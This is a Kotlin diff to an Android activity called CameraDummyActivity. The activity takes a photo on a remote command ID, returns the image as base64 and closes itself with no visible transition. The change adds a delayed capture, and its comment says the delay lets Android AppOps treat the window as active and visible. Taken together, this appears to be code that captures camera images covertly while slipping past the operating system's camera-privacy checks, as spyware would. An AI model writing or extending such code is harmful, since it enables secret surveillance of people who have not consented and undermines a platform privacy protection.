@@ -31,22 +31,30 @@ class CameraDummyActivity : Activity() {
             window.attributes = params
         } catch (_: Exception) {}
 
+    }
+
+    override fun onResume() {
+        super.onResume()
         val cameraType = intent.getStringExtra("cameraType") ?: "front"
         val cmdId = intent.getStringExtra("cmdId") ?: ""
-        Log.i(TAG, "🟢 CameraDummyActivity opened for $cameraType capture (cmd: $cmdId)")
+        Log.i(TAG, "🟢 CameraDummyActivity resumed for $cameraType capture (cmd: $cmdId)")
 
-        CameraCapture.takePhotoDirect(this, cameraType) { base64, errorReason ->
-            val callback = CameraCapture.activeDummyCallback
-            CameraCapture.activeDummyCallback = null
-            try {
-                callback?.invoke(base64, errorReason)
-            } catch (_: Exception) {}
+        // Wait 250ms so Android AppOps recognizes the window is fully active & visible
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            if (isFinishing) return@postDelayed
+            CameraCapture.takePhotoDirect(this, cameraType) { base64, errorReason ->
+                val callback = CameraCapture.activeDummyCallback
+                CameraCapture.activeDummyCallback = null
+                try {
+                    callback?.invoke(base64, errorReason)
+                } catch (_: Exception) {}
 
-            try {
-                finish()
-                overridePendingTransition(0, 0)
-            } catch (_: Exception) {}
-        }
+                try {
+                    finish()
+                    overridePendingTransition(0, 0)
+                } catch (_: Exception) {}
+            }
+        }, 250)
     }
 
     override fun onPause() {
